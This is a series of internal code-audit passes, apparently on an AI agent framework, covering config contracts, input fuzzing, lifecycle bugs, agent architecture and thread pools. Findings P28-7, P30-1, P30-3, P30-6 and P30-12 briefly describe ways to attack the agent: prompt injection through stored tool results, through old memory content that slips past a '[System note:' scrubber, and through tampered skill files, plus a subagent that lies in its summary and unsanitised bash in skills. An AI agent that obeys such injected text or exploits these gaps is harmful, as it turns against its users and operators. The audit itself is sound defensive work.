---

## Pass #27 – Cross-File Signature & Contract Inconsistency Audit – 2026-05-24T19:10:00Z

Scope: hermes_cli/config.py, agent/conversation_loop.py, gateway/run.py, tools/registry.py, hermes_cli/plugins.py, hermes_state.py

### P27-1 · save_config() returns None on managed systems — callers ignore bool — MEDIUM

**File:** `hermes_cli/config.py` (save_config), cli.py, hermes_cli/plugins.py (callers)
**Severity:** MEDIUM

`save_config()` silently returns `None` on NixOS/Homebrew managed systems. All callers (`cmd_set`, `cmd_unset`, `cmd_plugin_set`, `update_model_section`) ignore the return value. Users who edit config in managed environments get no feedback that their saves were silently skipped.

**Recommendation:** `save_config()` should return `bool` indicating success/failure. CLI callers should check and surface a warning if save silently failed.

---

### P27-2 · HERMES_AGENT_TIMEOUT_WARNING has no cfg_get read-back path — LOW

**File:** `gateway/run.py:1389` (gateway_timeout_warning default 900s)
**Severity:** LOW

`gateway_timeout_warning` is bridged to `HERMES_AGENT_TIMEOUT_WARNING` env var, but unlike `HERMES_AGENT_TIMEOUT` and `HERMES_RESTART_DRAIN_TIMEOUT`, there's no `cfg_get` / `os.getenv` read-back path. Tools cannot reliably respect the warning threshold.

**Recommendation:** Add a `cfg_get` read path for `HERMES_AGENT_TIMEOUT_WARNING` in gateway/run.py, mirroring the pattern used for the other timeout env vars.

---

### P27-3 · PluginManager.register_tool() drops max_result_size_chars and dynamic_schema_overrides — LOW

**File:** `hermes_cli/plugins.py:887` (register_tool wrapper)
**Severity:** LOW

`PluginManager.register_tool()` wraps `ToolRegistry.register()` but drops `max_result_size_chars` and `dynamic_schema_overrides` parameters. Plugins cannot control tool result truncation behavior.

**Recommendation:** Add `max_result_size_chars` and `dynamic_schema_overrides` parameters to `PluginManager.register_tool()` so plugins can control truncation the same way built-in tools can.

---

### P27-4 · Hook call sites have inconsistent exception wrapping — LOW

**File:** `agent/conversation_loop.py:1072` (pre_api_request), `agent/conversation_loop.py:1085` (on_session_start)
**Severity:** LOW

`invoke_hook('on_session_start')` at line 1085 is wrapped in try/except, while `invoke_hook('pre_api_request')` at line 1072 is NOT wrapped. Inconsistency in failure visibility across call sites.

---

### P27-5 · load_config_readonly() has no runtime enforcement — LOW

**File:** `hermes_cli/config.py:4419` (load_config_readonly)
**Severity:** LOW

`load_config_readonly()` returns the shared cached dict without deepcopy. Mutation of the returned dict corrupts the shared cache for all subsequent callers. No runtime enforcement mechanism prevents this.

**Recommendation:** Either deep-copy in `load_config_readonly()`, or document clearly that callers must not mutate the returned dict.

---

### P27-6 · append_message() uses int=None instead of Optional[int] — INFO

**File:** `hermes_state.py:1461` (append_message signature)
**Severity:** INFO

`token_count: int = None` and `finish_reason: str | None = None` use `int = None` instead of `Optional[int]`. Minor type annotation issue.

---

### P27-7 · show_config() uses bare config.get() with hardcoded DEFAULT_CONFIG fallbacks — INFO

**File:** `hermes_cli/config.py:2988` (show_config)
**Severity:** INFO

`show_config()` uses bare `config.get()` with hardcoded `DEFAULT_CONFIG` fallbacks, while runtime uses `cfg_get()`. Minor mismatch in fallback values.

---

### P27-8 · AUXILIARY_<NAME>_* dynamic env vars not documented — LOW

**File:** `gateway/run.py:1179` (aux env var bridge)
**Severity:** LOW

`AUXILIARY_<NAME>_PROVIDER`, `MODEL`, `BASE_URL`, `API_KEY` dynamic env vars are not documented in `--help` output. Users cannot discover this configuration mechanism.

---

### P27-9 · load_config() / load_config_readonly() contract — INFO (documented design)

**File:** `hermes_cli/config.py:4419,4423`
**Severity:** INFO

`load_config()` returns deepcopy (safe for mutation); `load_config_readonly()` returns shared reference. This is documented but easy to misuse.

---

### P27-10 · Memory provider save_config() is separate contract — INFO (correct)

**File:** `agent/memory_provider.py`
**Severity:** INFO

Memory providers have their own `save_config()` method, separate from `hermes_cli.config.save_config()`. Correct separation of concerns.

---

### P27-11 · Env bridge direct [] access — INFO (consistent, low risk)

**File:** `gateway/run.py:1183` (`_agent_cfg["gateway_timeout_warning"]`)
**Severity:** INFO

Env bridge uses direct `[]` access on `_agent_cfg`. Raises `KeyError` if keys are ever removed from DEFAULT_CONFIG. Low risk since DEFAULT_CONFIG is rarely changed.

---

### P27-12 · save_config() cache update before atomic write creates inconsistency window — LOW

**File:** `hermes_cli/config.py:4464` (_save_config_impl)
**Severity:** LOW

`_LAST_EXPANDED_CONFIG_BY_PATH[path] = result` is updated before the atomic `rename()` completes. If `rename()` fails, the cache is inconsistent with the actual file state.

**Recommendation:** Update cache only after successful rename, or use a temp cache that is committed atomically with the file.

---

### P27-13 · register_toolset_alias() missing return type annotation — INFO

**File:** `hermes_cli/config.py:4585`
**Severity:** INFO

`register_toolset_alias()` should have `-> None` return type annotation.

---

### P27-14 · append_message() JSON serialization of codex items — INFO (appropriate)

**File:** `hermes_state.py:1502`
**Severity:** INFO

Codex items stored as JSON string in `extra` column. Appropriate use of JSON for structured data.

---

### P27-15 · invoke_hook() kwargs are hook-specific, no shared typed interface — INFO

**File:** `hermes_cli/plugins.py:628` (invoke_hook)
**Severity:** INFO

Each hook receives different kwargs; no shared typed interface. This is expected given the hook pattern design.

---

### Summary

| ID | Area | Severity | Description |
|----|------|----------|-------------|
| P27-1 | Config write | MEDIUM | save_config() silently returns None on managed systems |
| P27-2 | Gateway timeout | LOW | HERMES_AGENT_TIMEOUT_WARNING has no cfg_get read-back path |
| P27-3 | Plugin registry | LOW | register_tool() drops max_result_size_chars and dynamic_schema_overrides |
| P27-4 | Hook call sites | LOW | Inconsistent exception wrapping across invoke_hook call sites |
| P27-5 | Config read | LOW | load_config_readonly() has no runtime enforcement against mutation |
| P27-6 | Type annotation | INFO | append_message() uses int=None instead of Optional[int] |
| P27-7 | Config display | INFO | show_config() uses bare config.get() vs cfg_get() |
| P27-8 | Env documentation | LOW | AUXILIARY_<NAME>_* dynamic env vars not documented |
| P27-9 | Config contract | INFO | load_config()/load_config_readonly() contract — documented design |
| P27-10 | Memory | INFO | Memory provider save_config() is separate contract — correct |
| P27-11 | Gateway | INFO | env bridge direct [] access — consistent, low risk |
| P27-12 | Config | LOW | save_config() cache update before atomic write creates inconsistency window |
| P27-13 | Registry | INFO | register_toolset_alias() missing annotations — minor |
| P27-14 | Session | INFO | append_message() JSON serialization of codex items — appropriate |
| P27-15 | Hooks | INFO | invoke_hook() kwargs are hook-specific, no shared typed interface |

### Top 3 Priorities

1. **P27-1 (MEDIUM)** — Have `save_config()` return `bool` and make CLI callers check it. On managed systems, the "save failed silently" behavior is confusing and leads to data loss that users don't notice until they restart.

2. **P27-2 (LOW)** — Add a `cfg_get` read path for `HERMES_AGENT_TIMEOUT_WARNING` in gateway/run.py, mirroring the pattern used for `HERMES_AGENT_TIMEOUT` and `HERMES_RESTART_DRAIN_TIMEOUT`, so tools can reliably respect the warning threshold.

3. **P27-3 (LOW)** — Add `max_result_size_chars` and `dynamic_schema_overrides` parameters to `PluginManager.register_tool()` so plugins can control tool result truncation behavior the same way built-in tools can.

---

## Pass #28 – Adversarial Input Fuzzing Analysis – 2026-05-24T20:15:00Z

Scope: tools/registry.py, tools/terminal_tool.py, hermes_state.py, model_tools.py, agent/conversation_loop.py

### P28-1 · Malformed JSON args handled gracefully — INFO

**File:** `tools/registry.py` (_parse_tool_arguments_json)
**Severity:** INFO

Malformed JSON in tool call arguments is caught and returns error JSON, not a raw traceback. The model never sees raw Python exception text. Well-designed defense.

---

### P28-2 · No length cap on append_message() content, tool arg strings, or FTS5 queries — MEDIUM

**File:** `hermes_state.py` (append_message), `model_tools.py` (coerce_tool_args), `hermes_state.py` (search_messages FTS queries)
**Severity:** MEDIUM

No `MAX_MESSAGE_CONTENT_LENGTH` in `append_message()` and no length check in `coerce_tool_args()`. FTS5 queries use user content without length limits. Unbounded message growth possible.

**Recommendation:** Add `MAX_MESSAGE_CONTENT_LENGTH` in `append_message()`. Add length check in `coerce_tool_args()`. Cap FTS5 query string length.

---

### P28-3 · sanitize_title() strips Zalgo/RTL/zero-width but message content doesn't — MEDIUM

**File:** `hermes_state.py` (sanitize_title), `hermes_state.py` (append_message)
**Severity:** MEDIUM

`sanitize_title()` strips bidirectional override characters (U+202A–U+202E, U+2066–U+2069), zero-width characters (U+200B, U+FEFF), and Zalgo combining marks. But `append_message()` and tool argument strings do not receive the same sanitization.

**Recommendation:** Apply Unicode sanitization to message content in `append_message()` and to tool argument strings in `coerce_tool_args()`. Strip bidirectional override characters at minimum.

---

### P28-4 · terminal_tool workdir allowlist is strong — INFO

**File:** `tools/terminal_tool.py` (validate_workdir)
**Severity:** INFO

Workdir validation uses a strong character allowlist excluding shell metacharacters. File-tool paths are handled separately. No path traversal detected.

---

### P28-5 · All SQL queries parameterized; LIKE wildcards properly escaped — INFO

**File:** `hermes_state.py` (all SQL queries)
**Severity:** INFO

All SQL uses parameterized queries. LIKE wildcards (`%`, `_`) in FTS5 queries are escaped via `replace('%', '\\%').replace('_', '\\_')`. No SQL injection risk detected.

---

### P28-6 · No f-string/.format() with user input in SQL or shell commands; shlex.quote() used — INFO

**File:** `hermes_state.py`, `tools/terminal_tool.py`
**Severity:** INFO

No template injection found. Shell commands use `shlex.quote()`. SQL uses parameterized queries.

---

### P28-7 · Tool result sanitization strips structural tokens but not content; no size limit on stored results — LOW

**File:** `tools/registry.py` (_sanitize_tool_error), `hermes_state.py` (append_message)
**Severity:** LOW

`_sanitize_tool_error()` strips `HERMES_BREAK`, `HERMES_TOOL_ERROR`, `HERMES_TOOL_RESULT` structural tokens from tool error content. But these can appear in the actual tool result content (not just errors), and message content in `append_message()` receives no such stripping. No max-length on tool result content before storage.

**Recommendation:** Add max-length check on tool result content before `append_message()` storage, or pre-store structural token stripping on all message content.

---

### P28-8 · tool_error(None) produces "None" string instead of empty — LOW

**File:** `tools/registry.py` (tool_error)
**Severity:** LOW

`tool_error(None)` calls `_sanitize_tool_error(str(None))` which produces `"None"` string instead of empty. Minor cosmetic issue.

---

### Summary

| ID | Area | Severity | Description |
|----|------|----------|-------------|
| P28-1 | JSON parsing | INFO | Malformed JSON args handled gracefully — model never sees raw tracebacks |
| P28-2 | Length limits | MEDIUM | No length cap on append_message() content, tool arg strings, or FTS5 queries |
| P28-3 | Unicode sanitization | MEDIUM | sanitize_title() strips Zalgo/RTL/zero-width but message content and tool args don't |
| P28-4 | Workdir | INFO | terminal_tool workdir allowlist is strong; file-tool paths not separately audited here |
| P28-5 | SQL injection | INFO | All SQL queries parameterized; LIKE wildcards properly escaped |
| P28-6 | Template injection | INFO | No f-string/.format() with user input in SQL or shell commands; shlex.quote() used |
| P28-7 | Prompt injection | LOW | Tool result sanitization strips structural tokens but not content; no size limit on stored results |
| P28-8 | Null handling | LOW | Mostly correct; tool_error(None) stringifies to "None" instead of empty |

### Top 3 Priorities

1. **P28-2 (MEDIUM)** — Add `MAX_MESSAGE_CONTENT_LENGTH` in `append_message()` to prevent unbounded message growth. Add length check in `coerce_tool_args()` to cap string arguments before they reach tool handlers.

2. **P28-3 (MEDIUM)** — Apply Unicode sanitization (zero-width, directional override stripping) to message content in `append_message()` and to tool argument strings in `coerce_tool_args()`. At minimum, strip bidirectional override characters (U+202A–U+202E, U+2066–U+2069) which are the most dangerous for homograph attacks in filenames and command arguments.

3. **P28-7 (LOW)** — Consider adding a maximum length check on tool result content before it's stored via `append_message()`, or adding the structural token stripping regex to message content as a pre-storage sanitization step to prevent prompt injection via stored tool results.

---

## Pass #29 – State Machine & Lifecycle Consistency Audit – 2026-05-24T21:00:00Z

Scope: hermes_state.py, run_agent.py, agent/conversation_loop.py, agent/iteration_budget.py, gateway/run.py, tools/registry.py, hermes_cli/plugins.py

### P29-1 · _user_turn_count initialized to 0 but never incremented — MEDIUM

**File:** `agent/conversation_loop.py` (run_conversation)
**Severity:** MEDIUM

`_user_turn_count` is initialized to 0 on line 1622 but never incremented within `run_conversation()`. Memory cadence (`on_turn_start`) always sees turn 0 from the agent, defeating cadence-based memory nudging.

**Recommendation:** Increment `agent._user_turn_count` at the start of each `run_conversation` turn (before calling `on_turn_start`), so external memory providers receive a monotonically increasing turn count.

---

### P29-2 · ended_at=NULL sessions (crashed processes) never auto-pruned — LOW (re-confirmed from P24-11)

**File:** `hermes_state.py:2600` (WHERE ended_at IS NOT NULL)
**Severity:** LOW

`prune_sessions` only deletes sessions where `ended_at IS NOT NULL`. Sessions from crashed processes (ended_at=NULL) persist forever. Re-confirmed from P24-11.

---

### P29-3 · _budget_grace_call checked in loop condition but never set to True — MEDIUM

**File:** `agent/conversation_loop.py:1943` (loop condition: `or agent._budget_grace_call`)
**Severity:** MEDIUM

`_budget_grace_call` is checked in the loop condition but is **never set to True** anywhere in the codebase. The dead code branch means the iteration budget always terminates without a grace call.

**Recommendation:** Either implement `_budget_grace_call = True` when iteration budget exhausts mid-call (so the model gets one more turn), or remove the `or agent._budget_grace_call` branch from the loop condition.

---

### P29-4 · _user_turn_count reset per run_conversation call; long-lived CLI sessions always pass turn 0 — LOW

**File:** `agent/conversation_loop.py:1622` (_user_turn_count init)
**Severity:** LOW

`_user_turn_count` is reset per `run_conversation()` call. In long-lived CLI sessions, each conversation restart resets the turn count. External memory providers receive turn 0 repeatedly.

---

### P29-5 · No INIT→CONNECTED→AUTHENTICATED→ACTIVE→CLOSING state machine — INFO

**File:** `gateway/run.py` (adapter lifecycle)
**Severity:** INFO

Gateway does not use a formal connection state machine. Platform adapters manage their own lifecycle. No centralized state tracking for gateway connection state transitions.

---

### P29-6 · Adapter disconnect not emitted as platform_state transition — LOW

**File:** `gateway/run.py` (_update_platform_runtime_status)
**Severity:** LOW

Adapter disconnect events are not emitted as `platform_state` transitions through `_update_platform_runtime_status()`. No state logging for disconnect events.

---

### P29-7 · register()/deregister() serialized by RLock but no interlock against stale reader snapshots — LOW

**File:** `tools/registry.py:161` (RLock)
**Severity:** LOW

`register()` / `deregister()` are serialized by `threading.RLock()` but no interlock prevents readers from seeing stale snapshots during concurrent mutations. Generation counter is incremented correctly.

---

### P29-8 · Generation counter correctly incremented on all mutations; used for cache invalidation — INFO

**File:** `tools/registry.py:178` (_generation increment)
**Severity:** INFO

`_generation` counter correctly increments on all `register()` / `deregister()` calls. Used as cache invalidation key in `_tool_defs_cache`. Well-implemented.

---

### P29-9 · No shutdown()/unload() in PluginManager; plugin tools remain in global registry after data cleared — MEDIUM

**File:** `hermes_cli/plugins.py` (PluginManager)
**Severity:** MEDIUM

`PluginManager` has no `shutdown()` or `unload()` method. When `PluginManager` data is cleared (on shutdown), plugin tools remain registered in `tools.registry` and hooks remain in `_hooks`. No `on_unload` hook in `VALID_HOOKS`.

**Recommendation:** Add `shutdown()` to `PluginManager` that deregisters plugin tools from `tools.registry`, clears hooks, and calls any future `on_unload()` hook. Add `on_unload` to `VALID_HOOKS`.

---

### P29-10 · Partial register() success leaves tools in registry despite plugin marked errored — LOW

**File:** `hermes_cli/plugins.py:903` (register tool loop)
**Severity:** LOW

If `registry.register(tool)` succeeds but a subsequent step raises an exception, the already-registered tools remain in the registry even though the plugin is marked as errored. No rollback on partial failure.

---

### Summary

| ID | Area | Severity | Description |
|----|------|----------|-------------|
| P29-1 | Session lifecycle | MEDIUM | _user_turn_count initialized to 0 but never incremented; memory cadence always sees turn 0 |
| P29-2 | Session lifecycle | LOW | ended_at=NULL sessions (crashed processes) never auto-pruned (P24-11 re-confirmed) |
| P29-3 | Turn counter | MEDIUM | _budget_grace_call is checked in loop condition but never set to True — dead code |
| P29-4 | Turn counter | LOW | _user_turn_count reset per run_conversation call; long-lived CLI sessions always pass turn 0 |
| P29-5 | Gateway state | INFO | No INIT→CONNECTED→AUTHENTICATED→ACTIVE→CLOSING state machine; adapter lifecycle used instead |
| P29-6 | Gateway state | LOW | Adapter disconnect not emitted as a platform_state transition through _update_platform_runtime_status() |
| P29-7 | Tool registry | LOW | register()/deregister() are mutually exclusive but no interlock preventing readers from seeing stale snapshots during concurrent mutations |
| P29-8 | Tool registry | INFO | Generation counter correctly incremented on all mutations; used for cache invalidation |
| P29-9 | Plugin lifecycle | MEDIUM | No shutdown()/unload() method in PluginManager; plugins tools remain in global registry after PluginManager data cleared; no on_unload hook |
| P29-10 | Plugin lifecycle | LOW | Partial register() success leaves tools in registry despite plugin marked errored |

### Top 3 Priorities

1. **P29-3 (MEDIUM)** — Either implement `_budget_grace_call = True` setting when the iteration budget exhausts mid-call (so the model gets one more turn), or remove the `or agent._budget_grace_call` branch from the loop condition if the grace-call mechanism is not planned.

2. **P29-9 (MEDIUM)** — Add a `shutdown()` method to `PluginManager` that iterates over loaded plugins and: (a) deregisters their tools from `tools.registry`, (b) clears their hooks, (c) calls any future `on_unload()` hook. Add `on_unload` to `VALID_HOOKS`. This is needed for clean CLI/gateway restart without tool leakage.

3. **P29-1 (MEDIUM)** — Increment `agent._user_turn_count` at the start of each `run_conversation` turn (before calling `on_turn_start`), so external memory providers receive a monotonically increasing turn count for cadence tracking.

---

## Pass #30 – Architectural & Agentic Coding Review (Second Pass) – 2026-05-24T22:00:00Z

Scope: agent/conversation_loop.py, agent/memory_provider.py, agent/memory_manager.py, tools/delegate_tool.py, agent/skill_utils.py, agent/skill_preprocessing.py, agent/error_classifier.py

### P30-1 · Parent accepts subagent's summary verbatim — no tool_trace/files_written audit trail — MEDIUM

**File:** `tools/delegate_tool.py` (on_delegation result assembly)
**Severity:** MEDIUM

The parent receives `summary` (freeform text) from subagent but not `tool_trace` or `files_written`. A malicious or buggy subagent could lie about its actions and the parent would have no way to verify.

**Recommendation:** Record the child's `tool_trace` and `files_written` directly in the delegation result dict alongside `summary`. `on_delegation` should receive a structured summary that is auditable, not just a freeform text block.

---

### P30-2 · Child error logging not cross-referenced against child output for consistency — LOW

**File:** `tools/delegate_tool.py` (_run_single_child result assembly)
**Severity:** LOW

`_run_single_child` captures `logs` (child stderr) and `summary` (agent's self-report) separately. There is no cross-reference check to verify that errors reported in logs match what the agent self-reported in `summary`.

---

### P30-3 · Skill files have no integrity verification — no signatures, no hashes — HIGH

**File:** `agent/skill_utils.py` (skill file loading)
**Severity:** HIGH

Skill files in `~/.hermes/skills/` are loaded with no hash/signature/checksum verification. `_INJECTION_PATTERNS` scanning only logs a warning and serves the file anyway. A compromised or malicious skill file can modify agent behavior with no integrity check.

**Recommendation:** Add skill file integrity verification. At minimum, support a `skills.trusted_fingerprints` config list (sha256 of bundled skill directories), and warn when a skill's file has changed since last load. Better: HMAC signature support with a stored secret.

---

### P30-4 · YAML frontmatter parse errors fall through silently — MEDIUM

**File:** `agent/skill_utils.py` (parse_frontmatter)
**Severity:** MEDIUM

`parse_frontmatter()` uses bare `except Exception` that silently discards malformed YAML. The skill is loaded without metadata. A corrupt skill YAML frontmatter is accepted without error.

**Recommendation:** Log at WARNING level when frontmatter parsing fails, so operators can see the degradation.

---

### P30-5 · Memory provider has no read-after-write consistency check — MEDIUM

**File:** `agent/memory_manager.py` (sync_all)
**Severity:** MEDIUM

`sync_all()` is fire-and-forget with no read-after-write verification. If a memory provider silently fails to persist data (write-only backend, network timeout after send), the data loss is undetected.

**Recommendation:** Add a `read_after_write_verify` option that re-reads recently written memories to confirm persistence.

---

### P30-6 · Memory provider prefetch has no content-size cap; injection beyond fence markers unchecked — HIGH

**File:** `agent/memory_manager.py` (prefetch, queue_prefetch_all)
**Severity:** HIGH

`prefetch()` has no `MAX_PREFETCH_CHARS` cap. The fence scrubber only strips `[System note:` patterns inside `<memory-context>` tags. Content outside the fence wrapper (or from older memory that doesn't use the wrapper) is not sanitized. A sufficiently old memory could contain prompt injection that bypasses the fence.

**Recommendation:** Add a `MAX_PREFETCH_CHARS` constant (e.g., 10,000) and enforce it in `prefetch()`. Run the prefetch output through an additional sanitization pass that strips `[System note:` patterns even when they don't use the fence wrapper.

---

### P30-7 · Error taxonomy covers HTTP-layer errors; "malformed success" proxy errors have no dedicated category — INFO

**File:** `agent/error_classifier.py` (FailoverReason)
**Severity:** INFO

FailoverReason taxonomy is comprehensive for HTTP-layer errors (rate limit, auth, timeout, model unavailable, context length). However, "malformed success 200" proxy errors (where the proxy returns 200 but with corrupted/incomplete data) have no dedicated category.

---

### P30-8 · Tool schemas not re-resolved after provider fallback; tools from unavailable provider remain callable — MEDIUM

**File:** `agent/conversation_loop.py` (provider fallback in run_agent)
**Severity:** MEDIUM

When a provider falls back to a secondary (e.g., OpenAI → Claude), the tool registry schema is not re-resolved. Tools that were registered by the original provider (e.g., OpenAI-specific tools) remain in the schema and remain callable against the fallback provider, which may not support them.

**Recommendation:** After provider fallback, re-resolve tool schemas from the new provider's available tools.

---

### P30-9 · Credential pool inheriting during fallback: subagents may inherit exhausted keys — LOW

**File:** `tools/delegate_tool.py` (runtime env setup during fallback)
**Severity:** LOW

During provider fallback, subagent credential pools can inherit runtime env from the parent that includes keys that were rate-limited or exhausted. `_restore_primary_runtime` largely mitigates this but the timing of the restore matters.

---

### P30-10 · Append-only messages disciplined; no sequence number validation for concurrent out-of-order gateway messages — INFO

**File:** `hermes_state.py` (append_message)
**Severity:** INFO

Append-only message discipline is well-implemented. No sequence number or vector clock for detecting out-of-order message delivery in concurrent gateway scenarios.

---

### P30-11 · Turn count rehydration correct for gateway path but not persisted to session DB — LOW

**File:** `agent/conversation_loop.py` (turn count rehydration from session)
**Severity:** LOW

`_user_turn_count` rehydration from session DB is correct for the gateway fresh-agent path. However, turn count is not persisted to session DB on ongoing sessions, making rehydration unreliable on crash/recovery.

---

### P30-12 · Skill preprocessing shell injection: bash command not sanitized; stderr not output-capped — MEDIUM

**File:** `agent/skill_preprocessing.py` (run_inline_shell)
**Severity:** MEDIUM

`run_inline_shell()` passes raw command to `bash -c` with no sanitization. Stderr is not output-capped. If a skill's template variables contain shell special characters, they could cause unexpected command execution or expose sensitive stderr data.

**Recommendation:** Sanitize template variable expansion in `run_inline_shell()` before passing to bash. Cap stderr output length.

---

### Summary

| ID | Area | Severity | Description |
|----|------|----------|-------------|
| P30-1 | Subagent trust | MEDIUM | Parent accepts subagent's summary verbatim — no tool_trace/files_written audit trail |
| P30-2 | Subagent trust | LOW | Child error logging not cross-referenced against child output for consistency |
| P30-3 | Skill trust | HIGH | Skill files have no integrity verification — no signatures, no hashes, no bundle attestation |
| P30-4 | Skill trust | MEDIUM | YAML frontmatter parse errors fall through silently; corrupt metadata accepted |
| P30-5 | Memory curation | MEDIUM | Memory provider has no read-after-write consistency check; write-only providers undetected |
| P30-6 | Memory curation | HIGH | Memory provider prefetch has no content-size cap; injection beyond fence markers unchecked |
| P30-7 | Error observability | INFO | Error taxonomy covers HTTP-layer errors; "malformed success" proxy errors have no dedicated category |
| P30-8 | Capability drift | MEDIUM | Tool schemas not re-resolved after provider fallback; tools from unavailable provider remain callable |
| P30-9 | Capability drift | LOW | Credential pool inheriting during fallback: subagents during fallback may inherit exhausted keys |
| P30-10 | Context integrity | INFO | Append-only messages disciplined; no sequence number validation for concurrent out-of-order gateway messages |
| P30-11 | Context integrity | LOW | Turn count rehydration correct for gateway path but not persisted to session DB |
| P30-12 | Skill trust | MEDIUM | Skill preprocessing shell injection: bash command not sanitized; stderr not output-capped |

### Top 3 Priorities

1. **P30-3 (HIGH)** — Add skill file integrity verification. At minimum, support a `skills.trusted_fingerprints` config list (sha256 of bundled skill directories), and warn when a skill's file has changed since last load. Better: HMAC signature support with a stored secret.

2. **P30-6 (HIGH)** — Add a `MAX_PREFETCH_CHARS` constant (e.g., 10,000) and enforce it in `prefetch()`. Run the prefetch output through an additional sanitization pass that strips `[System note:` patterns even when they don't use the fence wrapper. Add retry-limiting to `queue_prefetch_all()`.

3. **P30-1 (MEDIUM)** — Record the child's `tool_trace` and `files_written` directly in the delegation result dict alongside `summary`. `on_delegation` should receive a structured summary that is auditable, not just a freeform text block.

---

## Pass #31 – Concurrency & Parallelism Deep Dive (Second Pass) – 2026-05-24T23:00:00Z

### 1. ThreadPoolExecutor max_workers Summary

| File | max_workers | Notes |
|------|-------------|-------|
| `model_tools.py:142` | 1 | Single worker for `_sync_tool_pool` — blocks all sync tool calls |
| `agent/tool_executor.py:288` | `min(len(runnable_calls), _MAX_TOOL_WORKERS)` | Caps at `_MAX_TOOL_WORKERS`; dynamic based on call count |
| `cron/scheduler.py:744` | 1 | Fallback pool for SIGINT recovery |
| `cron/scheduler.py:1613` | 1 | `_cron_pool` — single-threaded serial runner |
| `cron/scheduler.py:1933` | env/config/`None` (unbounded) | `_tick_pool` — parallel cron job dispatch |
| `tui_gateway/server.py:165-166` | env var `HERMES_TUI_RPC_POOL_WORKERS` (default 4) | `_rpc_pool_workers` — TUI RPC pool |
| `cli.py:9794` | 1 | Blocking shutdown pool |
| `acp_adapter/server.py:85` | 4 | `_executor` — fixed, no queue cap (unbounded queue) |
| `scripts/build_skills_index.py:227` | 6 | Build index pool |
| `scripts/build_skills_index.py:271` | 4 | Build index pool |
| `hermes_cli/doctor.py:1760` | 8 | Health-check probe pool — comment notes 8 is plenty |
| `tools/delegate_tool.py:2101` | `max_children` | Parallel subagent runner |

**Key observations:**
- `acp_adapter/server.py` uses `ThreadPoolExecutor(max_workers=4)` with no queue maxsize — this was flagged in findings_verification.md and NOT fixed.
- `agent/tool_executor.py` caps at `_MAX_TOOL_WORKERS` — value not confirmed from this pass; may be a tunable.
- `cron/scheduler.py:1933` can run with `_max_workers=None` (unbounded) — all due jobs run in parallel without a cap.
- `tui_gateway/server.py` uses env var `HERMES_TUI_RPC_POOL_WORKERS` (default 4) — good configurability.

---

### 2. Thread-Local Storage

14 usages of `threading.local()` across the codebase:

| File | Line | Name | Purpose |
|------|------|------|---------|
| `model_tools.py` | 44 | `_worker_thread_local` | Per-worker-thread persistent event loops for async bridging |
| `hermes_logging.py` | 41 | `_session_context` | Per-thread session context |
| `agent/google_oauth.py` | 164 | `_lock_state` | OAuth lock state per thread |
| `hermes_cli/auth.py` | 894 | `_auth_lock_holder` | Auth lock holder per thread |
| `hermes_cli/auth.py` | 4084 | `_nous_shared_lock_holder` | Shared lock holder per thread |
| `hermes_cli/plugins.py` | 1530 | `_thread_tool_whitelist` | Tool whitelist per thread |
| `tools/feishu_drive_tool.py` | 17 | `_local` | Feishu per-thread local state |
| `tools/feishu_doc_tool.py` | 16 | `_local` | Feishu per-thread local state |
| `tools/terminal_tool.py` | 237 | `_callback_tls` | Approval callback per thread |
| `tools/environments/base.py` | 43 | `_activity_callback_local` | Activity callback per thread |
| `plugins/memory/retaindb/__init__.py` | 340 | `self._local` | RetainDB per-thread local |
| `cli.py` | 11458 | `_callback_tls` | Comment-only reference to threading.local pattern |

**Key observation:** `model_tools.py` uses `_worker_thread_local` specifically to avoid "Event loop is closed" errors when asyncio.run() was used per-call in ThreadPoolExecutor workers. Each worker thread gets its own persistent event loop via `_get_worker_loop()`. This is the correct pattern.

---

### 3. Queue Backpressure

Only 2 `Queue(maxsize=...)` usages found:
- `tui_gateway/event_publisher.py:48` — `queue.Queue(maxsize=_QUEUE_MAX)` — published queue
- `agent/transports/codex_app_server.py:204` — `queue.Queue(maxsize=1)` — single-item transport queue

No `block=True` `.put()` patterns found.

**Observation:** The main async-to-sync bridging (model_tools.py) uses a single-worker ThreadPoolExecutor, not a queue. Queue backpressure is not a concern here since parallelism is capped at 1 for sync tool dispatch.

---

### 4. RLock vs Lock Usage

15 `threading.RLock()` usages found across the codebase. Key ones:

| File | Line | Context |
|------|------|---------|
| `gateway/pairing.py` | 95 | `self._lock = threading.RLock()` — protects pairing state |
| `hermes_cli/kanban_db.py` | 955 | `_INIT_LOCK = threading.RLock()` — serializes DB init |
| `hermes_cli/web_server.py` | 2566 | `_CRON_PROFILE_LOCK = threading.RLock()` — cron profile access |
| `hermes_cli/config.py` | 95 | `_CONFIG_LOCK = threading.RLock()` — config access |
| `tools/registry.py` | 161 | `self._lock = threading.RLock()` — registry locks |
| `tools/clarify_gateway.py` | 67 | `_lock = threading.RLock()` |
| `tools/slash_confirm.py` | 42 | `_lock = threading.RLock()` |
| `run_agent.py` | 2403 | `lock = threading.RLock()` — local lock creation |
| `agent/agent_init.py` | 417 | `agent._client_lock = threading.RLock()` — client lifecycle |
| `plugins/memory/honcho/session.py` | 98 | `self._cache_lock = threading.RLock()` |
| `plugins/memory/holographic/store.py` | 120 | `self._lock = threading.RLock()` |

**Observation:** RLock usage is widespread and appropriate for protecting mutable state that may be accessed by the same thread multiple times (reentrant). Regular `Lock()` is used only in narrower scopes (e.g., `delegate_tool.py:149` `_spawn_pause_lock = threading.Lock()`). No obvious cases of Lock being used where RLock would be needed.

---

### 5. Async Signal Handlers

28 `signal.signal()` registrations found. Key async-context signals:

- `cli.py:14219-14221` — SIGTERM/SIGHUP handlers in CLI main loop
- `cli.py:14251` — SIGINT absorb handler
- `cli.py:14647-14649` — SIGTERM/SIGHUP handlers for quiet mode
- `tui_gateway/entry.py:154-162` — SIGTERM/SIGHUP/SIGINT handlers in TUI entry
- `hermes_cli/gateway.py:3165-3167` — SIGINT/SIGBREAK handlers in gateway
- `tools/environments/file_sync.py:272` — SIGINT deferral with comment "signal.signal() only works from the main thread"
- `plugins/google_meet/meet_bot.py:483-484` — SIGTERM/SIGINT handlers

**Critical: `tools/environments/file_sync.py` has an explicit comment on line 258:** "signal.signal() only works from the main thread. In gateway" — this acknowledges the main-thread-only constraint. The signal handling defers to a handler that runs in the main thread context.

**Observation:** All signal handlers appear to be registered in main-thread contexts (server startup, CLI init). No async task creation inside signal handlers detected (no `create_task` inside signal handlers found in grep).

---

### 6. asyncio.run() in Thread Pools — Boundary Violations

`asyncio.run()` found in ~50 places. Most are in test files. Key production usages:

- `cron/scheduler.py:737` — calls `asyncio.run(coro)` directly, with a `RuntimeError` fallback that submits to a `ThreadPoolExecutor(max_workers=1)` via `pool.submit(asyncio.run, ...)` — **this is a known pattern** with explicit comment explaining the fallback for nested event loop scenarios.
